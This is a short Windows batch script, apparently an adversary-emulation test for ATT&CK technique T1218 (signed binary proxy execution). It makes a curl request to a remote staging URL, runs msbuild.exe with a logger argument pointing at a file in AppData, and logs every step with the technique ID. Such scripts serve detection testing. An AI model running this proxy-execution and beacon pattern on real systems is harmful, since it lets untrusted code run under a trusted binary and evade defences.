@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8550\b28de361
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8550-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=control.txt
SET ewjmdkff=8550

SET rzqtp=%APPDATA%\!pudaazx!
SET vmxh=!rzqtp!\macula-simulations.log
SET rtbp=msbuild.exe

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=!drguvr!>> "!vmxh!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=!errorlevel!>> "!vmxh!" 2>nul

SET dlxj=!pjkcpgw!\!syjfr!
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: build_logger_target=!dlxj!>> "!vmxh!" 2>nul

SET ghkb=LoggerEntry,!dlxj!;MyParameters,Foo
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: command_args=!ghkb!>> "!vmxh!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_exec_start=!rtbp!>> "!vmxh!" 2>nul
!rtbp! /logger:!ghkb!
SET srhj=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_exec_complete=!srhj!>> "!vmxh!" 2>nul

SET yrj=1
SET nwf=
if !srhj! neq 0 (
 SET yrj=0
 SET nwf=assembly_load_failed
)

SET htaf=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2!
SET ubsq=!TIME: =0!
SET aqdc=!ubsq:~0,8!.!ubsq:~9,2!
echo [!htaf! !aqdc!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!yrj!:!nwf!>> "!vmxh!" 2>nul